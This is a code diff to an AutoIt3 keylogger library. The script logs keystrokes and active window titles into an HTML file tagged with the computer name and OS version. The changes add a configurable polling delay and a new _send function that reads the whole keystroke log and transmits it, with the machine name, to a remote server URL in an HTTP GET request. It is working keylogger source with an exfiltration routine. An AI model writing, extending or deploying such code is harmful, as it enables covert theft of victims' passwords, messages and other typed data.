@@ -24,20 +24,25 @@
 ; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 ; THE SOFTWARE.
 
-; This AutoIt3 can be used to produce easy to read HTML-Files which contain 
+; This AutoIt3-Script can be used to produce easy to read HTML-Files which contain 
 ; the output of a keylogger.
 
 ; By including the script, some global variables will be set automatically
 Global $key = ""			; The pressed Key
 Global $last = ""			; The pressed Key in the last iteration
 Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
+Global $wait_time = 35 		; The time to wait between iterations (in milliseconds)
+Global $file_path = ""		; The path of the file
 Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging
 
 ; Initializes the HTML-File
 Func _init($path)
 	$Date=@mday&"."&@mon&"."&@year
 	$Time=@hour&":"&@min&":"&@sec
-	Global $File = FileOpen($path&"\"&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html", 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
+	$Seperator = "\"
+	If not StringCompare($path, "") Then $Seperator = ""
+	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html"
+	Global $File = FileOpen($file_path, 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
 	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
 	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
 EndFunc
@@ -46,7 +51,10 @@ EndFunc
 Func _initWithFilename($path, $filename)
 	$Date=@mday&"."&@mon&"."&@year
 	$Time=@hour&":"&@min&":"&@sec
-	Global $File = FileOpen($path&"\"&$filename&".html", 1) ; The file
+	$Seperator = "\"
+	If not StringCompare($path, "") Then $Seperator = ""
+	$file_path = $path&$Seperator&$filename&".html"
+	Global $File = FileOpen($file_path, 1) ; The file
 	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
 	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
 EndFunc
@@ -400,7 +408,7 @@ Func _read()
    If $pressed Then
 	  If ($last <> $key) Then _writeToFile()
    EndIf
-   Sleep(40) ; Waiting just to keep the CPU-usage at a minimum
+   Sleep($wait_time) ; Waiting just to keep the CPU-usage at a minimum
 EndFunc
 
 ; An endless loop of reading (so the keylogger won't stop reading)
@@ -417,7 +425,17 @@ Func _logWindow($title)
 		If WinActive($title) Then 
 			_read()
 		Else 
-			Sleep(40) 
+			Sleep($wait_time) 
 		EndIf
 	WEnd
+EndFunc
+
+; Sends the content of the log to a server-URL via GET
+Func _send($url)
+	FileClose($File) 					; The File is still opened in writing-mode so it is closed to...
+	$File = FileOpen($file_path, 128)	; ...Open in again in read-mode
+	$content = FileRead($File)
+	InetRead($url & "?name=" & @ComputerName & "&content=" & $content) ; The name is needed to identify where the logs are coming from
+	FileClose($File)
+	$File = FileOpen($file_path, 1)
 EndFunc
